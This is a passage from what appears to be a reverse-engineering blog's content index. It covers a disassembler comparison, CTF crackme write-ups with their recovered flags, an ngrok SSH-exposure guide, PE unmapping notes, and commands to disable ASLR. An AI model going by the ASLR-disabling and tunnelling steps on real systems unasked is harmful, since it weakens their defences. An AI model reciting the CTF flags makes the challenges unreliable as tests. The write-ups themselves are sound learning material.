run on almost anything (probably you can even run it on your washing machine).\nMulti-arch (support multiple CPU families) You never know when you will have change architecture of analysed software, probably you will do the most of analysis for x86 or ARM, but it is good to be ready for any kind of analysis, especially when you are paying for some tools.\nOnce again IDA is not cheap and supports only 1 architecture for each home license.\nradare2 supports probably the biggest amount of architectures by default.\nNote: the rest of tools probably requires only install of some plugin to support extra architecture - IDA Home is an exception.\nDecompiler Probably the most desired feature in every disassembly product. Unfortunatelly IDA Home won\u0026rsquo;t have it built-in in this price and you need to pay full-price to get it (and this is very expensive toy).\nNote: I really hate to hate IDA, because I like this tool, but IDA have also another disadvantage (without hex-rays): local variables doesn\u0026rsquo;t support types.\nThis actually affects all plugins using i.e ghidra decompiler - if you have binary where some structure is created in the context of local variable, then you have to manually rename variables - even if definition of its structure is known for you.\nBut anyway Ghidra seems to have the best decompiler at this moment (even better that HexRays): with support for C++ classes, etc. Definately the strongest feature of Ghidra.\nFor Binja it is relatively fresh stuff (it is available from version 2.0), so hopefully it will be similarly good as Ghidra (binja-devs we are waiting for support of classes!).\nFinally r2 Cutter have some decompiler, but seems to prefer to use ghidra\u0026rsquo;s decompiler with as pretty good integration.\nDebugger IDA is the winner and the loser at the same time. Definately the ugliest and the less intuitive interface, but it also have win-feature in debugger (even if debugger is sometimes bugged): populate current code state to database. Very useful during unpacking or dynamic code modifications.\nNote: radare2 developed something called ESIL - very useful features for emulating code, analysis. Unfortunatelly it can\u0026rsquo;t run code handled by operating system (APIs).\nUpdate: actually binja from some time also can populate analysis database based on debugging session! (it happens auto-magically)\nPlugins Here I had very simple requirements: plugin API must be available AND used language must be up to date.\nGhidra failed here, because it is using Java or Python2 (Jython to be honest). Just no.\nI really like radare2 API, because it is just radare syntax :P Then binja API seems to be very intuitive, IDA contains the most complex API.\nBinaryNinja and radare2 have plugin managers which helps you to install plugins \u0026amp; keep them updated.\nSignatures Every dissasembly tool should have some mechanism for detecing commonly known functions and actually all of mentioned tools have such ability:\nBinaryNinja - own \u0026ldquo;Signatures\u0026rdquo; engine (I will work on support for FLIRT); Ghidra - own signatures engine + FLIRT support (plugin required); IDA Home - FLIRT, support for Lumina server is not known is not known yet; Radare2 - zignatures(iz?) + FLIRT. Patching From my perspective Binja contains the best user interface for this (you can invert jumps, xor pieces of code, etc just by few clicks), pretty good interface is in Cutter, ofc if you are masochist you can everything in radare2 ;)\nIn IDA patching is theorethically possible, but I won\u0026rsquo;t recommend it - much easier is to easier code in built-in hex editor than with very limited Assemble code feature.\nSymbolic contants Useful when you are analysing Windows binaries, just replace ugly int with more meaningful name.\nSummary From my perspective if you are just looking for your 1st tool to begin with in reverse engineering, then I would recommend you Ghidra (I know, it\u0026rsquo;s ugly - but it\u0026rsquo;s free), then you can start thinking about buying i.e BinaryNinja.\nPersonally I very like BinaryNinja - for the interface and incoming features, it seems to become very good tool in the near feature. I can\u0026rsquo;t also don\u0026rsquo;t recommend radare2 which is very powerful, but this tool requires a little bit more attention.\nI don\u0026rsquo;t think that IDA Home is worth of waiting (it will be available in May), because it seems to be very limited in comparision to other tools - I can change my mind onluif it will contain HexRays Decompiler built-in in home version.\nI hope this article will help you find your new favourite tool - if you have different opinion: please, share it in the comments :)\nReferences Binary Ninja Ghidra IDA Home radare2 \u0026amp; Cutter Light Saber icon by Delapouite under CC BY 3.0 ","permalink":"https://rehex.ninja/posts/comparision-of-re-tools/","summary":"\u003cp\u003eLet\u0026rsquo;s compare the most populare reverse-egineering with strong focus on \u003cstrong\u003epersonal\u003c/strong\u003e usage: \u003cem\u003eBinaryNinja\u003c/em\u003e, \u003cem\u003eGhidra\u003c/em\u003e, \u003cem\u003eIDA\u003c/em\u003e and \u003cem\u003eradare2\u003c/em\u003e.\u003c/p\u003e","title":"Comparision of Reverse-Engineering Tools"},{"content":"Warmup Warmup : Welcome to securinets CTF\nIn this task we are dealing with very simple function main:\nundefined8 main(void) { int64_t iVar1; undefined8 uVar2; uint32_t var_8h; undefined8 var_4h; write(1, 0x988, 0x1a); read(0, 0x201080, 0x31); iVar1 = strlen(0x201080); *(undefined *)(iVar1 + 0x20107f) = 0; var_8h = 0; strcpy(rsi, 0x201080); uVar2 = strlen(0x201080); memfrob(0x201080, uVar2); var_4h._0_4_ = 0; while ((int32_t)var_4h \u0026lt; 0x14) { var_8h = var_8h + (int32_t)(char)(*(uint8_t *)((int64_t)(int32_t)var_4h + 0x201020) ^ *(uint8_t *)((int64_t)(int32_t)var_4h + 0x201080)); var_4h._0_4_ = (int32_t)var_4h + 1; } if (var_8h == 0) { printf(0x9a8, rsi); } else { puts(0x9d5); } return 0; } In this function the memfrob is used, from manual you can learn that this function is xoring buffer with key 42, solution:\n\u0026gt;\u0026gt;\u0026gt; a = [ 0x46, 0x19, 0x5e, 0x0d, 0x59, 0x75, 0x5d, 0x1e, 0x58, 0x47, ... 0x75, 0x1b, 0x5e, 0x75, 0x5f, 0x5a, 0x75, 0x48, 0x45, 0x53] \u0026gt;\u0026gt;\u0026gt; r = [] \u0026gt;\u0026gt;\u0026gt; for b in a: ... r.append(b^42) ... \u0026gt;\u0026gt;\u0026gt; r [108, 51, 116, 39, 115, 95, 119, 52, 114, 109, 95, 49, 116, 95, 117, 112, 95, 98, 111, 121] \u0026gt;\u0026gt;\u0026gt; \u0026#34;\u0026#34;.join([chr(c) for c in r]) \u0026#34;l3t\u0026#39;s_w4rm_1t_up_boy\u0026#34; And execution:\nWelcome to SECURINETS CTF l3t\u0026#39;s_w4rm_1t_up_boy Good job You can submit with securinets{l3t\u0026#39;s_w4rm_1t_up_boy} ","permalink":"https://rehex.ninja/posts/writeup-securinets2020-warmup/","summary":"\u003ch1 id=\"warmup\"\u003eWarmup\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWarmup : Welcome to securinets CTF\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eIn this task we are dealing with very simple function main:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eundefined8 \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eint64_t\u003c/span\u003e iVar1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    undefined8 uVar2;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e var_8h;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    undefined8 var_4h;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ewrite\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x988\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x1a\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eread\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x201080\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x31\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    iVar1 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estrlen\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x201080\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(undefined \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)(iVar1 \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x20107f\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    var_8h \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003estrcpy\u003c/span\u003e(rsi, \u003cspan style=\"color:#ae81ff\"\u003e0x201080\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    uVar2 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estrlen\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x201080\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ememfrob\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x201080\u003c/span\u003e, uVar2);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    var_4h._0_4_ \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e ((\u003cspan style=\"color:#66d9ef\"\u003eint32_t\u003c/span\u003e)var_4h \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x14\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        var_8h \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e var_8h \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003eint32_t\u003c/span\u003e)(\u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e)(\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003euint8_t\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)((\u003cspan style=\"color:#66d9ef\"\u003eint64_t\u003c/span\u003e)(\u003cspan style=\"color:#66d9ef\"\u003eint32_t\u003c/span\u003e)var_4h \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x201020\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                         \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003euint8_t\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)((\u003cspan style=\"color:#66d9ef\"\u003eint64_t\u003c/span\u003e)(\u003cspan style=\"color:#66d9ef\"\u003eint32_t\u003c/span\u003e)var_4h \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x201080\u003c/span\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        var_4h._0_4_ \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003eint32_t\u003c/span\u003e)var_4h \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (var_8h \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x9a8\u003c/span\u003e, rsi);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0x9d5\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eIn this function the \u003ccode\u003ememfrob\u003c/code\u003e is used, from manual you can learn that this function is xoring buffer with key \u003ccode\u003e42\u003c/code\u003e, solution:\u003c/p\u003e","title":"Writeup - Securinets2020 Warmup"},{"content":"[re] Snake (10) Description Short info about task:\nName: Snake Difficulty: easy Score: 10 Flag should be in the format: HTB{username:password}\nOverview We have got the python script that is waiting for some username and password:\n$ python snake.py ___________.__ _________ __ \\__ ___/| |__ ____ / _____/ ____ _____ | | __ ____ | | | | \\_/ __ \\ \\_____ \\ / \\__ \\ | |/ // __ \\ | | | Y \\ ___/ / \\ | \\/ __ \\| \u0026lt;\\ ___/ |____| |___| /\\___ \u0026gt; /_______ /___| (____ /__|_ \\___ \u0026gt; \\/ \\/ \\/ \\/ \\/ \\/ \\/ The Snake Created by 3XPL017 Your number is 809 Authentication required Enter your username QWE Wrong username try harder Let\u0026rsquo;s look into code to get more info about how to get username and password.\nBypass code We can see partially obfuscated variables, that are later xored with some values, let\u0026rsquo;s try to get username.\nUsername Username is combined from random dropped variables that are of course hex-encoded letters (i.e db = '\\x6e').\nuser_input = raw_input(\u0026#39;Enter your username\\n\u0026#39;) if user_input == slither: pass else: print \u0026#39;Wrong username try harder\u0026#39; exit() To get correct username we should know the slither value, we can easly get it by printing before verification check.\nI\u0026rsquo;ve decided to \u0026lsquo;patch\u0026rsquo; above code into:\nuser_input = slither print \u0026#34;====\u0026gt; Username: {}\u0026#34;.format(user_input) if user_input == slither: pass \u0026gt; python snake.py ___________.__ _________ __ \\__ ___/| |__ ____ / _____/ ____ _____ | | __ ____ | | | | \\_/ __ \\ \\_____ \\ / \\__ \\ | |/ // __ \\ | | | Y \\ ___/ / \\ | \\/ __ \\| \u0026lt;\\ ___/ |____| |___| /\\___ \u0026gt; /_______ /___| (____ /__|_ \\___ \u0026gt; \\/ \\/ \\/ \\/ \\/ \\/ \\/ The Snake Created by 3XPL017 Your number is 351 Authentication required ====\u0026gt; Username: anaconda Enter your password PASSWORD Wrong password try harder Yay, so the username is anaconda, now we need to guess password.\nPassword pass_input = raw_input(\u0026#39;Enter your password\\n\u0026#39;) for passes in pass_input: for char in chars: if passes == str(chr(char)): print \u0026#39;Good Job\u0026#39; break else: print \u0026#39;Wrong password try harder\u0026#39; exit(0) break This part is much harder, because every input which starts with 'u' is accepted (we can realize it by checking runtime to which letter input is compared). This is probably \u0026ldquo;programming mistake\u0026rdquo;, now we should guess what author wanted to achieve - what kind of verification.\nWe can also get all chars array ([117, 100, 118, 118, 114, 106, 119, 97, 36, 36, 126, 114, 115, 125, 42, 115, 125, 42, 107, 42, 126, 124, 121, 118, 118]) and print this as string: \u0026quot;udvvrjwa$$~rs}*s}*k*~|yvv\u0026quot;, but this is not our password :/\nMaking a step back, by ignoring loop where chars are incremented by 0xA we can read that chars is just a message: \u0026quot;this is a troll\u0026quot;, so the real password is somewhere else.\nWe can also notice unused variable password: password = [0x69, 0x74, 0x73, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x65, 0x61, 0x73, 0x79], but this is just another rabbit hole:\n\u0026gt;\u0026gt;\u0026gt; password = [0x69, 0x74, 0x73, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x65, 0x61, 0x73, 0x79] \u0026gt;\u0026gt;\u0026gt; s = \u0026#34;\u0026#34; \u0026gt;\u0026gt;\u0026gt; for c in password: ... s += chr(c) ... \u0026gt;\u0026gt;\u0026gt; s \u0026#39;its not that easy\u0026#39; With some additional prints we can notice that output and lock = 5 variable are the same:\n==\u0026gt; chains: this is a troll ==\u0026gt; keys: password!! ==\u0026gt; auth: keep trying Your number is 774 Lock 5 ==\u0026gt; chars1: udvvrjwa$$ ==\u0026gt; chars2: udvvrjwa$$~rs}*s}*k*~|yvv My simplified code which gives above result:\n#!/usr/bin/python2.7 import random def print_array(name, chars): r = \u0026#34;\u0026#34; for c in chars: r += chr(c) print \u0026#34;==\u0026gt; {}: {}\u0026#34;.format(name, r) chains = [0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x74, 0x72, 0x6f, 0x6c, 0x6c] keys = [0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x21, 0x21] auth = [0x6b, 0x65, 0x65, 0x70, 0x20, 0x74, 0x72, 0x79, 0x69, 0x6e, 0x67] print_array(\u0026#34;chains\u0026#34;, chains) print_array(\u0026#34;keys\u0026#34;, keys) print_array(\u0026#34;auth\u0026#34;, auth) chars = [] lock_pick = random.randint(0, 0x3e8) lock = lock_pick * 2 lock = lock + 10 lock = lock / 2 lock = lock - lock_pick print \u0026#39;Your number is \u0026#39; + str(lock_pick) print \u0026#39;Lock \u0026#39; + str(lock) for key in keys: keys_encrypt = lock ^ key chars.append(keys_encrypt) print_array(\u0026#34;chars1\u0026#34;, chars) for chain in chains: chains_encrypt = chain + 0xA chars.append(chains_encrypt) print_array(\u0026#34;chars2\u0026#34;, chars) pass_input = raw_input(\u0026#39;Enter your password\\n\u0026#39;) for passes in pass_input: print chars for char in chars: if passes == str(chr(char)): print \u0026#39;Good Job\u0026#39; break else: print \u0026#39;Wrong password try harder\u0026#39; exit(0) break After we delete \u0026rsquo;troll-part\u0026rsquo; of password we can check the flag : HTB{anaconda:udvvrjwa$$} we will get a success.\nSummary After we will make some understanding of all strings, variables and code we can get the flag, but to be clear: this is more like try every possible flag challenge, than challenge which will allow you to learn something.\nIt\u0026rsquo;s just internet troll - but not very funny.\n","permalink":"https://rehex.ninja/posts/writeup-htb-snake/","summary":"\u003ch1 id=\"re-snake-10\"\u003e[re] Snake (10)\u003c/h1\u003e\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eShort info about task:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eName:\u003c/strong\u003e Snake\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDifficulty:\u003c/strong\u003e \u003cem\u003eeasy\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eScore:\u003c/strong\u003e 10\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eFlag should be in the format: HTB{username:password}\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\u003cp\u003eWe have got the python script that is waiting for some username and password:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e$ python snake.py\n\n___________.__               _________              __\n\\__    ___/|  |__   ____    /   _____/ ____ _____  |  | __ ____\n |    |   |  |  \\_/ __ \\   \\_____  \\ /    \\__  \\ |  |/ // __ \\\n |    |   |   Y  \\  ___/   /        \\   |  \\/ __ \\|    \u0026lt;\\  ___/\n |____|   |___|  /\\___  \u0026gt; /_______  /___|  (____  /__|_ \\___  \u0026gt;\n               \\/     \\/          \\/     \\/     \\/     \\/    \\/\n\n\nThe Snake Created by 3XPL017\nYour number is 809\nAuthentication required\n\nEnter your username\nQWE\nWrong username try harder\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eLet\u0026rsquo;s look into code to get more info about how to get username and password.\u003c/p\u003e","title":"Writeup - HTB Snake"},{"content":"Plugins worth installing\nFindYara - use yara rules for looking into binary Findcrypt YARA - find crypto structs with yara rules FIRST - community driven Lunsa function matching plugin Karta - open source lib functions matching Diaphora - diff binaries IDA IFL - interactive function list blc - decompiler based on Ghidra retdec - standalone decompiler ","permalink":"https://rehex.ninja/posts/ida-pro-plugins/","summary":"\u003cp\u003ePlugins worth installing\u003c/p\u003e","title":"Ida Pro Plugins"},{"content":"How to expose any port to the Internet without exposing your private IP (for free).\nToday I will show you how to easly setup exposure of any port without exposing your IP, this solution also bypasses situation when your ISP is not giving possibility to have private (own) IP address which is not behind any NAT.\nI used this solution to create access (for myself) to SSH and locally hosted security camera system at my home.\n1. Setup NGrok First of all you need to have an ngrok account[1] - free account is enough for our purposes. Generally ngrok is a reverse-proxy service where you need tun ngrok client on target machine, client enables connection with ngrok server and then you are able to connect with your machine (where ngrok client is running) via Internet.\nFree acount forwards local port as random remote port (usually under const hostname: 0.tcp.ngrok.io for tcp tunnels)\nAfter you have account you need to download client and activate account with your API key (follow the instuctions from web service).\n2. Verify that tunnel works Create ngrok config file (under ~/.ngrok2/ngrok.yml):\nauthtoken: \u0026lt;YOUR_TOKEN_HERE\u0026gt; tunnels: sshglob: proto: tcp addr: 22 Above config setups tunnel sshglob which forwards locally hosted tcp/22 - in this case SSH service. You should change these values according to your needs.\nNow you can try to start ngrok ngrok start sshglob:\nngrok by @inconshreveable (Ctrl+C to quit) Session Status online Account whoami (Plan: Free) Version 2.3.35 Region United States (us) Web Interface http://127.0.0.1:4040 Forwarding tcp://0.tcp.ngrok.io:13036 -\u0026gt; localhost:22 Connections ttl opn rt1 rt5 p50 p90 0 0 0.00 0.00 0.00 0.00 Now you should be able to connect with ssh (in my case) with command: ssh -p 13036 whoami@0.tcp.ngrok.io.\nIf you don\u0026rsquo;t have any issues with accessing you machine over Internet you are free to follow next steps :) (otherwise check Troubleshooting section).\n3. Bypass random port issue If you run ngrok couple of times you should notice that every time you service is running at random port, to bypass this issue you can by a premium or make some additional steps presented below.\nInstall dependencies sudo apt install -y python3 python3-pip curl jq pip3 install telegram Setup Telegram bot For myself I decided to create Telegram[2] bot which will send me external hostname and random IP address. Ofc you need to have created Telegram account to follow next steps.\nStart conversation with telegram Botfather. Type commands in Botfather conversation: /newbot mysuper_bot # replace \u0026#34;mysuper\u0026#34; with your bot name Copy API key and start conversation with your bot Type something in the chat \u0026amp; run the below code: from sys import argv import telegram bot = telegram.Bot(token=\u0026#34;YOUR_API_KEY\u0026#34;) print(bot.getUpdates()) Copy chat_id Create script tsend.py: from sys import argv import telegram bot = telegram.Bot(token=\u0026#34;YOUR_API_KEY\u0026#34;) # FIXME your api key chat_id = 1234 # FIXME YOUR_CHAT_ID raw_msg = argv[1].replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\u0026#39;).replace(\u0026#39;tcp://\u0026#39;,\u0026#39;\u0026#39;) # \u0026#34;tcp://0.tcp.ngrok.io:10361\u0026#34; ip,port = raw_msg.split(\u0026#39;:\u0026#39;) message = f\u0026#39;{ip}:{port}\u0026#39; bot.send_message(chat_id=chat_id, text=message) Check if you are able to send message to you from your bot by typing python3 tsend.py hello. Make your service always available Final step, below script will:\nStart ngrok tunnel if it is not running Send you actual IP:PORT thanks to telegram bot Below script is designed to be run from cron, thanks to this solution it will be run automatically i.e every 5 minutes: */5 * * * * path/to/monitor.sh\n# monitor.sh #!/bin/bash NGROK=\u0026#39;/usr/local/bin/ngrok\u0026#39; DIR=\u0026#34;$HOME/ngrok-apps\u0026#34; # directory containing this script and tsend.py URL_DIR=\u0026#39;/tmp/ngrok-url\u0026#39; # check if it\u0026#39;s working if [ ! \u0026#34;$(pidof ngrok)\u0026#34; ]; then echo \u0026#34;[ngrok] is not working, starting new instance...\u0026#34; $NGROK start sshglob \u0026gt; /dev/null \u0026amp; sleep 3 fi # get current status of tunnel NEW_STATUS=\u0026#34;$(curl -s http://127.0.0.1:4040/api/tunnels | jq \u0026#39;.tunnels[0] .public_url\u0026#39;)\u0026#34; echo \u0026#34;[ngrok] $(date) $NEW_STATUS\u0026#34; OLD_STATUS=\u0026#34;\u0026#34; if [ -e \u0026#34;$URL_DIR\u0026#34; ]; then OLD_STATUS=\u0026#34;$(cat $URL_DIR)\u0026#34; fi # check if differ if [ \u0026#34;$NEW_STATUS\u0026#34; != \u0026#34;$OLD_STATUS\u0026#34; ]; then echo \u0026#34;[ngrok] New status detected! Updating IP\u0026#34; echo \u0026#34;$NEW_STATUS\u0026#34; \u0026gt; \u0026#34;$URL_DIR\u0026#34; python3 \u0026#34;$DIR/tsend.py\u0026#34; \u0026#34;$NEW_STATUS\u0026#34; fi If everything works you should receive notification to your telegram if IP or port will change.\nTroubleshooting My ngrok tunnel is started, but I can\u0026rsquo;t access service Is this service running also on localhost? Or can you reach shown ngrok host (IP)?\nCan I use something else than telegram? Yes, but I had already telegram in place. If you need you can use i.e Discord, Slack, mail, etc. (but you need to modify tsend.py script)\nReferences https://ngrok.com/ https://telegram.org/ ","permalink":"https://rehex.ninja/posts/expose-any-port-with-ngrok/","summary":"\u003cp\u003eHow to expose any port to the Internet without exposing your private IP (for free).\u003c/p\u003e","title":"Expose Any Port With Ngrok"},{"content":"Prerequisities Make sure that you have dumped binary from memory (optionally) Fix PE headers if necessary Unmap With PE bear Open PE-bear \u0026gt; Sections \u0026gt; Section Headers Make sure that VA and VS matches RA and RS, so: RA[i] = VA[i] RS[i] = RA[i+1] - RA[i] RS.reloc = 0 VS[i] = RS[i] If you see some red blocks it means that PE is probably misalligned, check: Fix misalligned sections Fix misalligned sections Open binary in hex editor Go to the 1st section (on example above to 0x1000) Section should start in this place, nulls should be before. Append nulls starting from last null seen before 1st section (0xfdf) to section start address (inconclusive) (0x1000) Save. Review in PE Bear: Sections \u0026gt; Section Headers should no longer be marked as read. if Section Headers \u0026gt; Image Base is the same as dumped section address (if not, set it to dumped section address). ","permalink":"https://rehex.ninja/posts/unmap-pe-manually/","summary":"\u003ch2 id=\"prerequisities\"\u003ePrerequisities\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003eMake sure that you have dumped binary from memory\u003c/li\u003e\n\u003cli\u003e(optionally) Fix PE headers if necessary\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"unmap\"\u003eUnmap\u003c/h2\u003e\n\u003ch3 id=\"with-pe-bear\"\u003eWith PE bear\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eOpen \u003cem\u003ePE-bear\u003c/em\u003e \u0026gt; \u003cem\u003eSections\u003c/em\u003e \u0026gt; \u003cem\u003eSection Headers\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003eMake sure that VA and VS matches RA and RS, so:\n\u003col\u003e\n\u003cli\u003eRA[i] = VA[i]\u003c/li\u003e\n\u003cli\u003eRS[i] = RA[i+1] - RA[i]\u003c/li\u003e\n\u003cli\u003eRS.reloc = 0\u003c/li\u003e\n\u003cli\u003eVS[i] = RS[i]\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eIf you see some red blocks it means that PE is probably misalligned, check: \u003cem\u003eFix misalligned sections\u003c/em\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg alt=\"UnmapPE\" loading=\"lazy\" src=\"/img/unmap-pe.png\"\u003e\u003c/p\u003e","title":"Unmap PE Manually"},{"content":"Linux echo 0 | sudo tee /proc/sys/kernel/randomize_va_space radare2 # disable ASLR \u0026amp; reanalyse dor aslr=no aaa Windows Windows 7 Open RegEdit Goto: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\ Create new value (not a key): MoveImages with value 0. Reboot. Windows 10 Disable ASLR per file Set-Processmitigation -Name name.exe -Disable ForceRelocateImages Disable ASLR by default Search in Windows for: “windows defender Security Center” Click on the second icon from the bottom: “App \u0026amp; browser control” Scroll to the bottom and click on: “Exploit 